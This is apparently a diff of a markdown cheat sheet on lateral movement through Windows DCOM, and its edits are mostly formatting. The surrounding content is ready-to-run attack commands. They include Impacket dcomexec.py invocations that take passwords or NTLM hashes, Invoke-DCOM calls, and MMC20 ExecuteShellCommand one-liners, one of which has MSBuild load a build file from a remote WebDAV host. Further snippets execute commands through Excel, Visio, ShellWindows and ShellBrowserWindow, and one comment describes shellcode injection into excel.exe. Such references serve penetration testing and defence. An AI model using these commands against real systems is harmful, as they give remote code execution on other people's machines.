@@ -2,8 +2,8 @@
 
 > DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer.
 
+* [impacket/dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
 
-* Impacket DCOMExec.py
   ```ps1
   dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC] [-object [{ShellWindows,ShellBrowserWindow,MMC20}]] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-A authfile] [-keytab KEYTAB] target [command ...]
   dcomexec.py -share C$ -object MMC20 '<DOMAIN>/<USERNAME>:<PASSWORD>@<MACHINE_CIBLE>'
@@ -13,7 +13,9 @@
   # -object MMC20 specifies that we wish to instantiate the MMC20.Application object.
   # -silentcommand executes the command without attempting to retrieve the output.
   ```
-* CheeseTools - https://github.com/klezVirus/CheeseTools
+
+* [klezVirus/CheeseTools](https://github.com/klezVirus/CheeseTools)
+
   ```powershell
   # https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/
   -t, --target=VALUE         Target Machine
@@ -28,7 +30,9 @@
 
   Current Methods: MMC20.Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro.
   ```
-* Invoke-DCOM - https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1
+
+* [rvrsh3ll/Misc-Powershell-Scripts/Invoke-DCOM.ps1](https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1)
+
   ```powershell
   Import-Module .\Invoke-DCOM.ps1
   Invoke-DCOM -ComputerName '10.10.10.10' -Method MMC20.Application -Command "calc.exe"
@@ -38,8 +42,7 @@
   Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellWindows -Command "calc.exe"
   ```
 
-
-## DCOM via MMC Application Class 
+## DCOM via MMC Application Class
 
 This COM object (MMC20.Application) allows you to script components of MMC snap-in operations. there is a method named **"ExecuteShellCommand"** under **Document.ActiveView**.
 
@@ -52,23 +55,21 @@ PS C:\> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\Window
 PS C:\> [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.1")).Document.ActiveView.ExecuteShellCommand("c:\windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",$null,"\\10.10.10.2\webdav\build.xml","7")
 ```
 
-Invoke-MMC20RCE : https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1
-
+[n0tty/powershellery/Invoke-MMC20RCE.ps1](https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1)
 
 ## DCOM via Office
 
 * Excel.Application
-  * DDEInitiate
-  * RegisterXLL
+    * DDEInitiate
+    * RegisterXLL
 * Outlook.Application
-  * CreateObject->Shell.Application->ShellExecute
-  * CreateObject->ScriptControl (office-32bit only)
+    * CreateObject->Shell.Application->ShellExecute
+    * CreateObject->ScriptControl (office-32bit only)
 * Visio.InvisibleApp (same as Visio.Application, but should not show the Visio window)
-  * Addons
-  * ExecuteLine
+    * Addons
+    * ExecuteLine
 * Word.Application
-  * RunAutoMacro
-
+    * RunAutoMacro
 
 ```ps1
 # Powershell script that injects shellcode into excel.exe via ExecuteExcel4Macro through DCOM
@@ -91,7 +92,6 @@ $visio = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.InvisibleA
 $visio.Addons.Add("C:\Windows\System32\cmd.exe").Run("/c calc")
 ```
 
-
 ## DCOM via ShellExecute
 
 ```ps1
@@ -100,7 +100,6 @@ $obj = [System.Activator]::CreateInstance($com)
 $item = $obj.Item()
 $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
 ```
-
 
 ## DCOM via ShellBrowserWindow
 
@@ -111,7 +110,6 @@ $com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"10.10.10
 $obj = [System.Activator]::CreateInstance($com)
 $obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
 ```
-
 
 ## References
 
